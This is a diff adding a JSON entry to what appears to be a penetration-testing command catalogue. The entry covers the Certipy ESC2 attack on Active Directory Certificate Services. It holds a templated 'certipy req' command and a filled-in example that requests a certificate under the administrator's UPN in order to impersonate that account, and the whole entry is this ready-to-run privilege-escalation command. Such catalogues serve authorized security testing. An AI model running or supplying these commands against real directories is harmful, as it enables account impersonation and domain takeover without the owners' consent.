@@ -1,0 +1,16 @@
+{
+  "id": "certipy-esc2",
+  "name": "Certipy ESC2 (Any Purpose EKU)",
+  "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -template '<template>' -upn '<target>@<domain>'",
+  "description": "ESC2: template has the Any Purpose EKU (or no EKU at all), so the issued cert can be used for any purpose including client authentication. Request as your user but specify a privileged UPN to impersonate.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap"],
+  "tags": ["certipy", "adcs", "esc2", "any-purpose-eku"],
+  "references": [
+    { "title": "Certipy ESC2", "url": "https://github.com/ly4k/Certipy" }
+  ],
+  "examples": [
+    "certipy req -u jdoe@corp.local -p Password123! -dc-ip 10.10.10.10 -ca CORP-CA -template AnyPurpose -upn administrator@corp.local"
+  ]
+}
